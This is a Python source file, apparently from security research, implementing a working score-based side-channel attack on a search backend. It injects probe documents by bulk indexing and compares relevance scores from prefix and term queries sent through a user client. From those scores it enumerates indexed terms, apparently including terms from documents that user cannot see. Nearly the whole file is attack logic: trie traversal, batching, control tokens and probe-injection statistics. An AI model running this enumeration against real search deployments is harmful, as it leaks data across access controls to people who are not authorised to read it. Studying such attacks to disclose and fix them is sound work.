# Copyright 2026 MongoDB
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from __future__ import annotations

import json
import random
import threading
from dataclasses import dataclass
from typing import Callable, Dict, Iterable, List, Optional, Sequence, Set, TypeVar

from .analyzer import AnalyzerTrieTraversal
from .constants import (
    EXACT_CONTROL_CHARS,
    INDEX_NAME,
    PREFIX_CONTROL_CHARS,
    PREFIX_QUERY_MODE_MATCH_PHRASE_PREFIX,
    PREFIX_QUERY_MODE_SPAN_PREFIX,
)
from .prefix_oracles import PrefixOracle, PrefixProbe, PrefixScorePolicy
from .progress import AttackProgressDisplay
from .search_backend import SearchBackend
from .telemetry import TimingTelemetry
from .types import SearchClient
from .utils import JsonDict, chunks


Probe = TypeVar("Probe")

# Dividers inserted between packed unigram exact probes. They are analyzer-visible
# non-attack tokens, so search_as_you_type cannot index synthetic shingles like
# "1 2" from a packed document that contains both unigram probes.
EXACT_PROBE_DIVIDER_LEN = 8


@dataclass
class AttackStats:
    prefix_batches: int = 0
    exact_batches: int = 0
    prefixes_tested: int = 0
    exact_terms_tested: int = 0
    exact_terms_skipped_prefix_negative: int = 0
    exact_terms_inferred_leaf: int = 0
    logical_match_phrase_prefix_queries: int = 0
    logical_span_prefix_queries: int = 0
    logical_term_queries: int = 0
    msearch_requests: int = 0
    msearch_match_phrase_prefix_requests: int = 0
    msearch_span_prefix_requests: int = 0
    msearch_term_requests: int = 0
    probe_docs_injected: int = 0
    prefix_probe_docs_injected: int = 0
    exact_probe_docs_injected: int = 0
    bulk_injection_requests: int = 0
    prefix_bulk_injection_requests: int = 0
    exact_bulk_injection_requests: int = 0

    @property
    def logical_score_queries(self) -> int:
        return (
            self.logical_match_phrase_prefix_queries
            + self.logical_span_prefix_queries
            + self.logical_term_queries
        )


@dataclass(frozen=True)
class ExactProbe:
    term: str
    control: str


class MatchPhrasePrefixEnumerator:
    def __init__(
        self,
        admin_client: SearchClient,
        user_client: SearchClient,
        backend: SearchBackend,
        traversal: AnalyzerTrieTraversal,
        *,
        max_term_len: Optional[int],
        max_expansions: int,
        batch_size: Optional[int],
        auto_batch_max_bytes: Optional[int],
        auto_batch_max_probes: Optional[int],
        exact_strategy: str,
        prefix_oracle: PrefixOracle,
        prefix_score_policy: PrefixScorePolicy,
        verbose_prefixes: bool,
        progress_interval: float,
        progress_dataset: str = "unknown",
        progress_tty: bool = False,
        rich_force_terminal: bool = False,
        exact_check_inferred_leaves: bool = False,
        telemetry: Optional[TimingTelemetry] = None,
    ) -> None:
        if batch_size is None and (
            auto_batch_max_bytes is None or auto_batch_max_probes is None
        ):
            raise ValueError("auto batching requires byte and probe-count limits")
        self.admin_client = admin_client
        self.user_client = user_client
        self.backend = backend
        self.traversal = traversal
        self.max_term_len = max_term_len
        self.max_expansions = max_expansions
        self.batch_size = batch_size
        self.auto_batch_max_bytes = auto_batch_max_bytes
        self.auto_batch_max_probes = auto_batch_max_probes
        self.exact_strategy = exact_strategy
        self.prefix_oracle = prefix_oracle
        self.prefix_query_mode = prefix_oracle.name
        self.prefix_score_policy = prefix_score_policy
        self.verbose_prefixes = verbose_prefixes
        self.progress_interval = progress_interval
        self.progress_dataset = progress_dataset
        self.progress_tty = progress_tty
        self.rich_force_terminal = rich_force_terminal
        self.exact_check_inferred_leaves = exact_check_inferred_leaves
        self.telemetry = telemetry if telemetry is not None else TimingTelemetry()
        self.probe_counter = 0
        self.used_prefix_controls: Set[str] = set()
        self.used_prefix_control_prefixes: Set[str] = set()
        self.used_prefix_control_prefix_counts: Dict[int, int] = {}
        self.used_exact_controls: Set[str] = set()
        self.used_contexts: Set[str] = set()
        self.stats = AttackStats()
        self.progress_last_activity = "not started"
        self.progress_lock = threading.Lock()
        self.progress_stop_event = threading.Event()
        self.progress_thread: Optional[threading.Thread] = None
        self.progress_display: Optional[AttackProgressDisplay] = None
        self.progress_title = "1-gram enumeration"

    def enumerate_terms(self) -> Set[str]:
        self.start_progress()
        try:
            if self.exact_strategy == "eager":
                return self.enumerate_terms_eager()
            if self.exact_strategy == "optimized":
                return self.enumerate_terms_optimized()
            raise ValueError(f"unknown exact strategy: {self.exact_strategy}")
        finally:
            self.stop_progress()

    def enumerate_terms_eager(self) -> Set[str]:
        self.set_progress("starting eager traversal")
        current_level = self.traversal.initial_prefixes()
        seen: Set[str] = set()
        terms: Set[str] = set()

        level = 0
        while current_level:
            level += 1
            candidates = self.new_candidates(current_level, seen)
            self.set_progress(
                f"eager level={level} candidates={len(candidates)} "
                f"seen={len(seen)} recovered={len(terms)}"
            )
            next_level: List[str] = []

            for chunk in self.candidate_chunks(candidates):
                prefix_results = self.prefix_or_term_exists_many(chunk)
                exact_results = self.exact_term_exists_many(chunk)

                for prefix in chunk:
                    has_extension = prefix_results[prefix]
                    is_term = exact_results[prefix]
                    self.print_prefix_outcome(
                        prefix,
                        has_extension,
                        exact_term=is_term,
                    )

                    if is_term:
                        self.record_recovered_term(terms, prefix)
                    if has_extension:
                        next_level.extend(
                            self.traversal.child_prefixes(
                                prefix,
                                max_term_len=self.max_term_len,
                            )
                        )

            current_level = next_level

        return terms

    def enumerate_terms_optimized(self) -> Set[str]:
        self.set_progress("starting optimized traversal")
        current_level = self.traversal.initial_prefixes()
        known_prefix_results: Optional[Dict[str, bool]] = None
        seen: Set[str] = set()
        terms: Set[str] = set()

        level = 0
        while current_level:
            level += 1
            candidates = self.new_candidates(current_level, seen)
            self.set_progress(
                f"optimized level={level} candidates={len(candidates)} "
                f"seen={len(seen)} recovered={len(terms)}"
            )
            if not candidates:
                current_level = []
                known_prefix_results = None
                continue

            if known_prefix_results is None:
                prefix_results = self.prefix_or_term_exists_many(candidates)
                self.count_prefix_negative_exact_skips(prefix_results, candidates)
            else:
                prefix_results = known_prefix_results

            positive_prefixes = [
                prefix for prefix in candidates if prefix_results.get(prefix, False)
            ]
            self.set_progress(
                f"optimized level={level} positive_prefixes={len(positive_prefixes)} "
                f"from candidates={len(candidates)}"
            )
            child_prefixes_by_parent, child_candidates = self.child_prefixes_for(
                positive_prefixes,
                seen,
            )
            self.set_progress(
                f"optimized level={level} probing children={len(child_candidates)}"
            )
            child_prefix_results = self.prefix_or_term_exists_many(child_candidates)
            self.count_prefix_negative_exact_skips(
                child_prefix_results,
                child_candidates,
            )

            exact_candidates, inferred_leaf_terms = self.classify_exact_candidates(
                positive_prefixes,
                child_prefixes_by_parent,
                child_prefix_results,
            )
            self.set_progress(
                f"optimized level={level} exact_candidates={len(exact_candidates)} "
                f"inferred_leaf_terms={len(inferred_leaf_terms)}"
            )
            exact_results = self.exact_term_exists_many(exact_candidates)

            self.record_level_results(
                terms,
                candidates,
                prefix_results,
                exact_results,
                inferred_leaf_terms,
            )
            current_level = [
                child
                for child in child_candidates
                if child_prefix_results.get(child, False)
            ]
            known_prefix_results = child_prefix_results

        return terms

    def new_candidates(self, prefixes: Sequence[str], seen: Set[str]) -> List[str]:
        candidates: List[str] = []
        for prefix in prefixes:
            if prefix in seen or (
                self.max_term_len is not None and len(prefix) > self.max_term_len
            ):
                continue
            seen.add(prefix)
            candidates.append(prefix)
        return candidates

    def child_prefixes_for(
        self,
        prefixes: Sequence[str],
        seen: Set[str],
    ) -> tuple[Dict[str, List[str]], List[str]]:
        children_by_parent: Dict[str, List[str]] = {}
        child_candidates: List[str] = []
        for prefix in prefixes:
            children = [
                child
                for child in self.traversal.child_prefixes(
                    prefix,
                    max_term_len=self.max_term_len,
                )
                if child not in seen
            ]
            children_by_parent[prefix] = children
            child_candidates.extend(children)
        return children_by_parent, list(dict.fromkeys(child_candidates))

    def classify_exact_candidates(
        self,
        positive_prefixes: Sequence[str],
        child_prefixes_by_parent: Dict[str, List[str]],
        child_prefix_results: Dict[str, bool],
    ) -> tuple[List[str], Set[str]]:
        exact_candidates: List[str] = []
        inferred_leaf_terms: Set[str] = set()

        for prefix in positive_prefixes:
            positive_children = [
                child
                for child in child_prefixes_by_parent.get(prefix, [])
                if child_prefix_results.get(child, False)
            ]
            if positive_children:
                exact_candidates.append(prefix)
            elif self.traversal.can_fully_expand_children(
                prefix,
                max_term_len=self.max_term_len,
            ):
                if self.exact_check_inferred_leaves:
                    exact_candidates.append(prefix)
                else:
                    inferred_leaf_terms.add(prefix)
            else:
                exact_candidates.append(prefix)

        return exact_candidates, inferred_leaf_terms

    def record_level_results(
        self,
        terms: Set[str],
        candidates: Sequence[str],
        prefix_results: Dict[str, bool],
        exact_results: Dict[str, bool],
        inferred_leaf_terms: Set[str],
    ) -> None:
        for prefix in candidates:
            has_extension = prefix_results.get(prefix, False)
            if not has_extension:
                self.print_prefix_outcome(prefix, has_extension, exact_term=None)
                continue

            if prefix in inferred_leaf_terms:
                self.stats.exact_terms_inferred_leaf += 1
                self.print_prefix_outcome(
                    prefix,
                    has_extension,
                    exact_term=True,
                    inferred=True,
                )
                self.record_recovered_term(terms, prefix, inferred=True)
                continue

            is_term = exact_results.get(prefix, False)
            self.print_prefix_outcome(prefix, has_extension, exact_term=is_term)
            if is_term:
                self.record_recovered_term(terms, prefix)

    def count_prefix_negative_exact_skips(
        self,
        prefix_results: Dict[str, bool],
        prefixes: Sequence[str],
    ) -> None:
        self.stats.exact_terms_skipped_prefix_negative += sum(
            1 for prefix in prefixes if not prefix_results.get(prefix, False)
        )

    def candidate_chunks(self, candidates: Sequence[str]) -> Iterable[Sequence[str]]:
        if self.batch_size is None:
            yield candidates
        else:
            yield from chunks(candidates, self.batch_size)

    def prefix_or_term_exists_many(
        self,
        prefixes: Sequence[str],
    ) -> Dict[str, bool]:
        probes = [self.prepare_prefix_probe(prefix) for prefix in prefixes]
        results: Dict[str, bool] = {}
        for chunk in self.probe_chunks(probes, self.prefix_request_bytes):
            results.update(self.prefix_or_term_exists_prepared_batch(chunk))
        return results

    def exact_term_exists_many(self, terms: Sequence[str]) -> Dict[str, bool]:
        probes = [self.prepare_exact_probe(term) for term in terms]
        results: Dict[str, bool] = {}
        for chunk in self.probe_chunks(probes, self.exact_request_bytes):
            results.update(self.exact_term_exists_prepared_batch(chunk))
        return results

    def prefix_or_term_exists_prepared_batch(
        self,
        probes: Sequence[PrefixProbe],
    ) -> Dict[str, bool]:
        if not probes:
            return {}
        self.set_progress(f"prefix batch probes={len(probes)} preparing injection")
        self.stats.prefix_batches += 1
        self.stats.prefixes_tested += len(probes)

        self.add_probe_docs(self.prefix_probe_docs(probes), injection_kind="prefix")
        return self.prefix_oracle.evaluate(self, probes)

    def exact_term_exists_prepared_batch(
        self,
        probes: Sequence[ExactProbe],
    ) -> Dict[str, bool]:
        if not probes:
            return {}
        self.set_progress(f"exact batch probes={len(probes)} preparing injection")
        self.stats.exact_batches += 1
        self.stats.exact_terms_tested += len(probes)

        self.add_probe_docs(self.exact_probe_docs(probes), injection_kind="exact")

        values = self.exact_values(probes)
        scores = self.term_scores(self.exact_query_field(), values)
        results: Dict[str, bool] = {}
        for i, probe in enumerate(probes):
            candidate_score = scores[2 * i]
            control_score = scores[2 * i + 1]
            results[probe.term] = control_score > candidate_score
        return results

    def prepare_prefix_probe(self, prefix: str) -> PrefixProbe:
        return PrefixProbe(
            prefix=prefix,
            control=self.prefix_control_for(prefix),
            context=self.random_control(
                10,
                self.prefix_context_chars(),
                self.used_contexts,
            ),
        )

    def prefix_context_chars(self) -> str:
        return self.prefix_oracle.context_chars

    def prepare_exact_probe(self, term: str) -> ExactProbe:
        return ExactProbe(term=term, control=self.exact_control_for(term))

    def prefix_control_for(self, prefix: str) -> str:
        return self.random_prefix_control_like(
            prefix,
            PREFIX_CONTROL_CHARS,
            self.used_prefix_controls,
            self.used_prefix_control_prefixes,
            self.used_prefix_control_prefix_counts,
        )

    def exact_control_for(self, term: str) -> str:
        return self.random_control(10, EXACT_CONTROL_CHARS, self.used_exact_controls)

    def exact_query_field(self) -> str:
        return "text"

    def probe_chunks(
        self,
        probes: Sequence[Probe],
        request_bytes: Callable[[Sequence[Probe]], int],
    ) -> Iterable[Sequence[Probe]]:
        if self.batch_size is not None:
            yield from chunks(probes, self.batch_size)
            return

        start = 0
        while start < len(probes):
            chunk_len = self.largest_auto_chunk(probes, start, request_bytes)
            yield probes[start : start + chunk_len]
            start += chunk_len

    def largest_auto_chunk(
        self,
        probes: Sequence[Probe],
        start: int,
        request_bytes: Callable[[Sequence[Probe]], int],
    ) -> int:
        assert self.auto_batch_max_bytes is not None
        assert self.auto_batch_max_probes is not None
        remaining = min(len(probes) - start, self.auto_batch_max_probes)
        if remaining <= 0:
            return 0

        single_size = request_bytes(probes[start : start + 1])
        if single_size > self.auto_batch_max_bytes:
            raise RuntimeError(
                "single auto-batched probe exceeds request byte budget "
                f"({single_size} > {self.auto_batch_max_bytes})"
            )

        best = 1
        probe_count = 2
        while probe_count <= remaining:
            size = request_bytes(probes[start : start + probe_count])
            if size > self.auto_batch_max_bytes:
                break
            best = probe_count
            probe_count *= 2

        if best == remaining:
            return best

        high = min(probe_count - 1, remaining)
        low = best + 1
        while low <= high:
            mid = (low + high) // 2
            size = request_bytes(probes[start : start + mid])
            if size <= self.auto_batch_max_bytes:
                best = mid
                low = mid + 1
            else:
                high = mid - 1
        return best

    def prefix_probe_docs(self, probes: Sequence[PrefixProbe]) -> List[JsonDict]:
        candidate_parts = [
            f"{probe.context} {self.extend_token(probe.prefix)}"
            for probe in probes
        ]
        control_parts = [
            f"{probe.context} {self.extend_token(probe.control)}"
            for probe in probes
        ]
        return [
            {"text": " ".join(candidate_parts), "public": True},
            {"text": " ".join(control_parts), "public": True},
        ]

    def exact_probe_docs(self, probes: Sequence[ExactProbe]) -> List[JsonDict]:
        return [
            {
                "text": self.join_exact_probe_terms(
                    [probe.term for probe in probes]
                ),
                "public": True,
            },
            {
                "text": self.join_exact_probe_terms(
                    [probe.control for probe in probes]
                ),
                "public": True,
            },
        ]

    def exact_values(self, probes: Sequence[ExactProbe]) -> List[str]:
        values: List[str] = []
        for probe in probes:
            values.extend([probe.term, probe.control])
        return values

    def join_exact_probe_terms(self, terms: Sequence[str]) -> str:
        if not terms:
            return ""
        parts = [terms[0]]
        for gap_index, term in enumerate(terms[1:], start=1):
            parts.append(self.exact_probe_divider(gap_index))
            parts.append(term)
        return " ".join(parts)

    def exact_probe_divider(self, gap_index: int) -> str:
        # One analyzer-visible non-attack token between unigram probes prevents
        # search_as_you_type from indexing synthetic corpus-token shingles.
        return self.control_from_index(
            gap_index,
            EXACT_PROBE_DIVIDER_LEN,
            EXACT_CONTROL_CHARS,
        )

    def prefix_request_bytes(self, probes: Sequence[PrefixProbe]) -> int:
        bulk_body = self.probe_bulk_body(
            self.prefix_probe_docs(probes),
            start_counter=self.probe_counter,
        )
        msearch_body = self.msearch_request_body(
            self.prefix_oracle.request_bodies(self, probes)
        )
        return max(self.ndjson_bytes(bulk_body), self.ndjson_bytes(msearch_body))

    def exact_request_bytes(self, probes: Sequence[ExactProbe]) -> int:
        bulk_body = self.probe_bulk_body(
            self.exact_probe_docs(probes),
            start_counter=self.probe_counter,
        )
        values = self.exact_values(probes)
        msearch_body = self.msearch_request_body(
            self.term_query_bodies(self.exact_query_field(), values)
        )
        return max(self.ndjson_bytes(bulk_body), self.ndjson_bytes(msearch_body))

    def term_scores(self, field: str, values: Sequence[str]) -> List[float]:
        return self.search_scores(
            self.term_query_bodies(field, values),
            [f"{field}={value!r}" for value in values],
            query_kind="term",
        )

    def term_query_bodies(self, field: str, values: Sequence[str]) -> List[JsonDict]:
        return [
            {
                "size": 1,
                "_source": False,
                "query": {"term": {field: value}},
            }
            for value in values
        ]

    @staticmethod
    def msearch_request_body(bodies: Sequence[JsonDict]) -> List[JsonDict]:
        request_body: List[JsonDict] = []
        for body in bodies:
            request_body.append({})
            request_body.append(body)
        return request_body

    @staticmethod
    def ndjson_bytes(items: Sequence[JsonDict]) -> int:
        return sum(
            len(
                json.dumps(item, separators=(",", ":"), ensure_ascii=False).encode(
                    "utf-8"
                )
            )
            + 1
            for item in items
        )

    def search_scores(
        self,
        bodies: Sequence[JsonDict],
        labels: Sequence[str],
        *,
        query_kind: str,
    ) -> List[float]:
        if not bodies:
            return []

        request_body = self.msearch_request_body(bodies)

        self.record_msearch_stats(query_kind, len(bodies))
        self.set_progress(
            f"sending {query_kind} _msearch "
            f"queries={len(bodies)} first={self.short_label(labels[0])}"
        )
        with self.telemetry.opensearch(f"attack.msearch.{query_kind}"):
            response = self.backend.msearch(
                self.user_client,
                index=INDEX_NAME,
                body=request_body,
            )
        self.set_progress(f"completed {query_kind} _msearch queries={len(bodies)}")
        response_items = response.get("responses", [])
        if len(response_items) != len(bodies):
            raise RuntimeError(
                f"_msearch returned {len(response_items)} responses for {len(bodies)} queries"
            )
        scores: List[float] = []
        for label, item in zip(labels, response_items):
            if "error" in item:
                raise RuntimeError(f"score query failed for {label}: {item['error']}")
            if item["hits"]["total"]["value"] == 0:
                raise RuntimeError(f"no visible probe hit for {label}")
            scores.append(float(item["hits"]["max_score"]))
        return scores

    def record_msearch_stats(self, query_kind: str, logical_queries: int) -> None:
        self.stats.msearch_requests += 1
        if query_kind == PREFIX_QUERY_MODE_MATCH_PHRASE_PREFIX:
            self.stats.logical_match_phrase_prefix_queries += logical_queries
            self.stats.msearch_match_phrase_prefix_requests += 1
        elif query_kind == PREFIX_QUERY_MODE_SPAN_PREFIX:
            self.stats.logical_span_prefix_queries += logical_queries
            self.stats.msearch_span_prefix_requests += 1
        elif query_kind == "term":
            self.stats.logical_term_queries += logical_queries
            self.stats.msearch_term_requests += 1
        else:
            raise ValueError(f"unknown query kind: {query_kind}")

    def add_probe_docs(
        self,
        docs: Iterable[JsonDict],
        *,
        injection_kind: str,
    ) -> None:
        docs = list(docs)
        body = self.probe_bulk_body(docs, start_counter=self.probe_counter)
        self.probe_counter += len(docs)
        body_bytes = self.ndjson_bytes(body)
        self.stats.probe_docs_injected += len(docs)
        self.stats.bulk_injection_requests += 1
        if injection_kind == "prefix":
            self.stats.prefix_probe_docs_injected += len(docs)
            self.stats.prefix_bulk_injection_requests += 1
        elif injection_kind == "exact":
            self.stats.exact_probe_docs_injected += len(docs)
            self.stats.exact_bulk_injection_requests += 1
        else:
            raise ValueError(f"unknown injection kind: {injection_kind}")
        self.set_progress(
            f"injecting {injection_kind} probe docs={len(docs)} bytes={body_bytes}"
        )
        with self.telemetry.opensearch(f"attack.bulk.{injection_kind}"):
            self.backend.bulk(self.admin_client, body, refresh=True)
        self.set_progress(f"completed {injection_kind} probe injection docs={len(docs)}")

    @staticmethod
    def probe_bulk_body(
        docs: Sequence[JsonDict],
        *,
        start_counter: int,
    ) -> List[JsonDict]:
        body: List[JsonDict] = []
        for offset, doc in enumerate(docs, start=1):
            body.append(
                {
                    "index": {
                        "_index": INDEX_NAME,
                        "_id": f"mpp-attack-probe-{start_counter + offset}",
                    }
                }
            )
            body.append(doc)
        return body

    def print_stats(self) -> None:
        print("attack stats:")
        print(f"  exact strategy: {self.exact_strategy}")
        print(f"  prefix query mode: {self.prefix_query_mode}")
        print(f"  prefix score policy: {self.prefix_score_policy.description()}")
        if self.batch_size is None:
            print("  batch size: auto")
            print(f"  auto batch byte budget: {self.auto_batch_max_bytes}")
            print(f"  auto batch max probes: {self.auto_batch_max_probes}")
        else:
            print(f"  batch size: {self.batch_size}")
        print(f"  prefixes tested: {self.stats.prefixes_tested}")
        print(f"  exact terms tested: {self.stats.exact_terms_tested}")
        print(
            "  exact terms skipped after negative prefix oracle: "
            f"{self.stats.exact_terms_skipped_prefix_negative}"
        )
        print(f"  exact terms inferred as leaves: {self.stats.exact_terms_inferred_leaf}")
        print(f"  prefix batches: {self.stats.prefix_batches}")
        print(f"  exact batches: {self.stats.exact_batches}")
        print(f"  logical queries total: {self.stats.logical_score_queries}")
        print(
            "  logical queries match_phrase_prefix: "
            f"{self.stats.logical_match_phrase_prefix_queries}"
        )
        print(f"  logical queries span_prefix: {self.stats.logical_span_prefix_queries}")
        print(f"  logical queries term: {self.stats.logical_term_queries}")
        print(f"  msearch requests total: {self.stats.msearch_requests}")
        print(
            "  msearch requests match_phrase_prefix: "
            f"{self.stats.msearch_match_phrase_prefix_requests}"
        )
        print(f"  msearch requests span_prefix: {self.stats.msearch_span_prefix_requests}")
        print(f"  msearch requests term: {self.stats.msearch_term_requests}")
        print(f"  probe docs injected total: {self.stats.probe_docs_injected}")
        print(f"  probe docs injected prefix: {self.stats.prefix_probe_docs_injected}")
        print(f"  probe docs injected exact: {self.stats.exact_probe_docs_injected}")
        print(f"  bulk injection requests total: {self.stats.bulk_injection_requests}")
        print(
            "  bulk injection requests prefix: "
            f"{self.stats.prefix_bulk_injection_requests}"
        )
        print(f"  bulk injection requests exact: {self.stats.exact_bulk_injection_requests}")

    def start_progress(self) -> None:
        if self.progress_interval <= 0:
            return
        self.progress_stop_event.clear()
        self.progress_display = AttackProgressDisplay(
            dataset=self.progress_dataset,
            title=self.progress_title,
            stats_getter=lambda: self.stats,
            activity_getter=self.current_progress_activity,
            progress_tty=self.progress_tty,
            force_terminal=self.rich_force_terminal,
        )
        self.progress_display.start()
        self.write_progress(final=False)
        self.progress_thread = threading.Thread(
            target=self.progress_loop,
            name="attack-progress",
            daemon=True,
        )
        self.progress_thread.start()

    def stop_progress(self) -> None:
        if self.progress_thread is None:
            return
        self.set_progress("finished enumeration")
        self.progress_stop_event.set()
        self.progress_thread.join(timeout=1)
        self.write_progress(final=True)
        if self.progress_display is not None:
            self.progress_display.stop()
            self.progress_display = None
        self.progress_thread = None

    def progress_loop(self) -> None:
        while not self.progress_stop_event.wait(self.progress_interval):
            self.write_progress(final=False)

    def set_progress(self, activity: str) -> None:
        if self.progress_interval <= 0:
            return
        with self.progress_lock:
            self.progress_last_activity = activity

    def current_progress_activity(self) -> str:
        with self.progress_lock:
            return self.progress_last_activity

    def write_progress(self, *, final: bool) -> None:
        if self.progress_display is not None:
            self.progress_display.update(final=final)

    def rich_progress_enabled(self) -> bool:
        return (
            self.progress_display is not None
            and self.progress_display.rich_enabled
            and self.progress_interval > 0
        )

    @staticmethod
    def short_label(label: str, max_len: int = 120) -> str:
        if len(label) <= max_len:
            return label
        return label[: max_len - 3] + "..."

    def record_recovered_term(
        self,
        terms: Set[str],
        term: str,
        *,
        inferred: bool = False,
    ) -> None:
        if term in terms:
            return
        terms.add(term)
        if self.rich_progress_enabled():
            return
        if not self.verbose_prefixes:
            suffix = " (inferred leaf)" if inferred else ""
            print(f"recovered term: {term}{suffix}")

    def print_prefix_outcome(
        self,
        prefix: str,
        prefix_or_term: bool,
        *,
        exact_term: Optional[bool],
        inferred: bool = False,
    ) -> None:
        if not self.verbose_prefixes:
            return
        if exact_term is None:
            exact_label = "skipped"
        elif inferred:
            exact_label = "inferred"
        else:
            exact_label = str(exact_term)
        print(f"{prefix}: prefix_or_term={prefix_or_term} exact_term={exact_label}")

    def random_prefix_control_like(
        self,
        value: str,
        alphabet: str,
        used: Set[str],
        used_prefixes: Set[str],
        used_prefix_counts: Dict[int, int],
    ) -> str:
        return self.random_prefix_control(
            len(value),
            alphabet,
            used,
            used_prefixes,
            used_prefix_counts,
            disallow=value,
        )

    def random_control_at_least(
        self,
        min_length: int,
        alphabet: str,
        used: Set[str],
        disallow: Optional[str] = None,
    ) -> str:
        length = max(1, min_length)
        while True:
            capacity = len(alphabet) ** length
            disallow_in_alphabet = (
                disallow is not None
                and len(disallow) == length
                and all(ch in alphabet for ch in disallow)
            )
            unavailable = len(used) + int(disallow_in_alphabet and disallow not in used)
            if unavailable < capacity:
                return self.random_control(length, alphabet, used, disallow=disallow)
            length += 1

    def random_control(
        self,
        length: int,
        alphabet: str,
        used: Set[str],
        disallow: Optional[str] = None,
    ) -> str:
        capacity = len(alphabet) ** length
        disallow_in_alphabet = (
            disallow is not None
            and len(disallow) == length
            and all(ch in alphabet for ch in disallow)
        )
        unavailable = len(used) + int(disallow_in_alphabet and disallow not in used)
        if unavailable >= capacity:
            raise RuntimeError(
                "control alphabet exhausted "
                f"(length={length}, alphabet_size={len(alphabet)}, used={len(used)})"
            )

        for _ in range(1000):
            control = "".join(random.choice(alphabet) for _ in range(length))
            if control != disallow and control not in used:
                used.add(control)
                return control

        for i in range(capacity):
            control = self.control_from_index(i, length, alphabet)
            if control != disallow and control not in used:
                used.add(control)
                return control
        raise RuntimeError(
            "control alphabet exhausted after deterministic fallback "
            f"(length={length}, alphabet_size={len(alphabet)}, used={len(used)})"
        )

    def random_prefix_control(
        self,
        length: int,
        alphabet: str,
        used: Set[str],
        used_prefixes: Set[str],
        used_prefix_counts: Dict[int, int],
        disallow: Optional[str] = None,
    ) -> str:
        capacity = len(alphabet) ** length
        disallow_in_alphabet = (
            disallow is not None
            and len(disallow) == length
            and all(ch in alphabet for ch in disallow)
        )
        unavailable = used_prefix_counts.get(length, 0)
        if disallow_in_alphabet and disallow not in used_prefixes:
            unavailable += 1
        if unavailable >= capacity:
            raise RuntimeError(
                "prefix control alphabet exhausted "
                f"(length={length}, alphabet_size={len(alphabet)}, "
                f"reserved_prefixes={unavailable})"
            )

        for _ in range(1000):
            control = "".join(random.choice(alphabet) for _ in range(length))
            if self.prefix_control_available(control, used, used_prefixes, disallow):
                self.reserve_prefix_control(
                    control,
                    used,
                    used_prefixes,
                    used_prefix_counts,
                )
                return control

        for i in range(capacity):
            control = self.control_from_index(i, length, alphabet)
            if self.prefix_control_available(control, used, used_prefixes, disallow):
                self.reserve_prefix_control(
                    control,
                    used,
                    used_prefixes,
                    used_prefix_counts,
                )
                return control
        raise RuntimeError(
            "prefix control alphabet exhausted after deterministic fallback "
            f"(length={length}, alphabet_size={len(alphabet)}, "
            f"reserved_prefixes={unavailable})"
        )

    @staticmethod
    def prefix_control_available(
        control: str,
        used: Set[str],
        used_prefixes: Set[str],
        disallow: Optional[str],
    ) -> bool:
        return (
            control != disallow
            and control not in used
            and control not in used_prefixes
        )

    @staticmethod
    def reserve_prefix_control(
        control: str,
        used: Set[str],
        used_prefixes: Set[str],
        used_prefix_counts: Dict[int, int],
    ) -> None:
        used.add(control)
        for end in range(1, len(control) + 1):
            prefix = control[:end]
            if prefix not in used_prefixes:
                used_prefixes.add(prefix)
                used_prefix_counts[end] = used_prefix_counts.get(end, 0) + 1

    @staticmethod
    def control_from_index(index: int, length: int, alphabet: str) -> str:
        base = len(alphabet)
        chars = []
        for _ in range(length):
            index, remainder = divmod(index, base)
            chars.append(alphabet[remainder])
        return "".join(reversed(chars))

    def extend_token(self, prefix: str, min_len: int = 16) -> str:
        suffix_len = max(1, min_len - len(prefix))
        return prefix + (self.traversal.probe_suffix_char * suffix_len)
